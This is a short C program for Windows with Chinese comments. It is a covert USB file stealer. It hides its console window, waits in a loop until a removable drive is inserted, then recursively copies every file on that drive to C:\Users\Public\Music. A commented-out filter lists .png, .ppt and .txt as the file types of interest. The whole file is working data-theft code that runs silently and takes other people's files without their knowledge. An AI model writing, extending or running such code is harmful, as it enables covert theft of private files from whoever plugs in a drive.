#include <stdio.h>
#include <windows.h>

void FindFile(const char *filename)//取文件函数
{
	char tempPath[300] = { 0 };
	sprintf_s(tempPath, "%s\\*.*", filename);

	WIN32_FIND_DATA finddata;
	HANDLE hfile = FindFirstFile(tempPath, &finddata);
	while (1) //遍历目录
	{

		//1.文件夹
		if (finddata.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY)
		{
			//特殊文件夹绕过
			if (finddata.cFileName[0] != '.')
			{
				sprintf_s(tempPath, "%s\\%s", filename, finddata.cFileName);
				FindFile(tempPath);
			}
		}
		//2.文件
		else
		{
			//if (strstr(finddata.cFileName, ".png") ||//感兴趣的文件类型
			//	strstr(finddata.cFileName, ".ppt") ||
			//	strstr(finddata.cFileName, ".txt"))
			/*{*/

			sprintf_s(tempPath, "%s\\%s", filename, finddata.cFileName);//取全部路径

				char newpath[300] = { 0 };
				sprintf_s(newpath, "C:\\Users\\Public\\Music\\%s", finddata.cFileName);//路径转换
				CopyFile(tempPath, newpath, FALSE);//拷贝文件到newpath路径
			/*}*/

		}

		if (FindNextFile(hfile, &finddata) == 0)//遍历结束跳出循环
			break;
	
	}


}

int main()//取U盘盘符
{
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE); //隐藏窗口
	char path[5] = { 0 };
	unsigned allDisk;//定义无符号数据

	printf("正在检测U盘插拔...\n");
	while (1)//循环
	{
		allDisk = GetLogicalDrives();//遍历盘符
		for (int i = 0; i < 10; i++)
		{
			if ((allDisk & 1) == 1)//存在一个盘符
			{
				sprintf_s(path, "%c:", 'A' + i);
				if (GetDriveType(path) == DRIVE_REMOVABLE)//检测磁盘类型
					break;//跳出循环
			}
			allDisk = allDisk >> 1;
		}
		if (GetDriveType(path) == DRIVE_REMOVABLE)//检测磁盘类型
			break;//跳出循环
	}
	FindFile(path);//定义盘符为path
	
	return 0;

}